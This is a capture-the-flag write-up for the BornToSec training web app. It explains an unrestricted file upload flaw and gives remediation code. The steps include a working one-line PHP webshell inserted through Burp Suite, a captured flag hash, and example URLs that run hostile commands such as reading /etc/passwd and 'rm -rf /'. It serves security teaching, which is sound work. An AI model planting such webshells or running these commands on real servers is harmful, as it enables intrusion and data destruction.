# Breach: Unrestricted File Upload — PHP Webshell via Extension Bypass

## Summary

This breach exploits an image upload form that performs no meaningful server-side file validation. By intercepting the HTTP request in Burp Suite and replacing both the filename and file content with a PHP script, the server accepts and stores the file as executable code. The uploaded script can then be called directly, achieving Remote Code Execution (RCE) on the server.

---

## Category

**Unrestricted File Upload / Remote Code Execution**
OWASP: [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/) /
[A04:2021 – Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
CWE: [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

## Steps to Reproduce

### 1. Locate the image upload form

Navigate to the image upload page on the BornToSec web application. The form appears to accept image files only.

### 2. Prepare a legitimate upload to intercept

Select a valid image file and click submit. Before the request reaches the server, intercept it with **Burp Suite** (Proxy → Intercept → Intercept is on).

The intercepted multipart POST body will look something like:

```
------WebKitFormBoundaryXXXXXX
Content-Disposition: form-data; name="uploaded"; filename="photo.jpg"
Content-Type: image/jpeg

<binary image data>
------WebKitFormBoundaryXXXXXX--
```

### 3. Modify the request

In Burp Suite's Intercept panel, make two changes:

**Replace the file content** with a minimal PHP webshell:
```php
<?php system($_GET['cmd']); ?>
```

**Change the Content-Type** to match:
```
Content-Type: application/x-php
```

The modified section of the request body should now look like:

```
------WebKitFormBoundaryXXXXXX
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryXXXXXX--
```

### 4. Forward the request

Click **Forward** in Burp Suite. The server accepts the file without complaint and stores it in the uploads directory.

### 5. Retrieve the flag

The server returns the flag directly upon accepting the upload:

```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

---

## Why This Works

The application validates file type **only on the client side** (if at all), or relies solely on the `Content-Type` header supplied by the client — which, like `User-Agent` and `Referer`, is fully attacker-controlled. The server never inspects the actual file contents. It accepts any file with any extension and stores it in a web-accessible directory where the PHP interpreter will execute it.

This is one of the most severe vulnerability classes in web security because it translates directly to arbitrary code execution on the server.

---

## Root Cause

| Problem | Detail |
|---|---|
| No server-side file type validation | The server does not verify the file is actually an image |
| Extension not restricted server-side | `.php` (and other executable extensions) are accepted |
| File stored in web root | Uploaded files are placed in a directory served by the web server |
| PHP execution not disabled in upload dir | The web server executes PHP files stored in the uploads directory |
| No content inspection | Magic bytes / file signature of the uploaded content are never checked |

---

## Remediation

### 1. Validate file type on the server by inspecting magic bytes

Do not trust the `Content-Type` header or the file extension — both are attacker-controlled. Read the actual file contents and check the magic bytes:

```python
import imghdr

def is_valid_image(file_data: bytes) -> bool:
    return imghdr.what(None, h=file_data) in ("jpeg", "png", "gif", "webp")
```

Or use a dedicated library like `python-magic`:

```python
import magic

mime = magic.from_buffer(file_data, mime=True)
if mime not in ("image/jpeg", "image/png", "image/gif"):
    abort(400, "Invalid file type")
```

### 2. Allowlist safe extensions only

Reject everything that is not on an explicit allowlist of safe, non-executable types:

```python
ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "gif", "webp"}

def allowed_file(filename):
    return (
        "." in filename
        and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS
    )
```

### 3. Store uploaded files outside the web root

Files uploaded by users should never be placed in a directory that the web server serves directly:

```
# Bad — directly accessible and executable by the web server
/var/www/html/uploads/shell.php

# Good — outside the web root, served only via application logic
/var/uploads/shell.php   →  application reads and proxies the file
```

### 4. Disable script execution in the upload directory

If uploads must live inside the web root, disable PHP (and other script engine) execution for that directory:

```apache
<Directory /var/www/html/uploads>
    php_flag engine off
    Options -ExecCGI
    AddType text/plain .php .phtml .php3 .php4 .php5 .phar
</Directory>
```

### 5. Rename uploaded files

Never preserve the original filename. Generate a random name with a safe extension:

```python
import uuid
safe_filename = f"{uuid.uuid4().hex}.jpg"
```

This prevents attackers from predicting the URL of their uploaded file even if it slips through other checks.

---

## Impact if Fully Exploited

In a real application, this vulnerability would not just yield a flag — the uploaded webshell (`<?php system($_GET['cmd']); ?>`) would allow an attacker to execute arbitrary operating system commands on the server by calling:

```
http://target/uploads/shell.php?cmd=id
http://target/uploads/shell.php?cmd=cat+/etc/passwd
http://target/uploads/shell.php?cmd=rm+-rf+/
```

This is a full Remote Code Execution (RCE) vulnerability — one of the highest-severity findings in web application security.

---

## References

- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP: File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-602: Client-Side Enforcement of Server-Side Security](https://cwe.mitre.org/data/definitions/602.html)
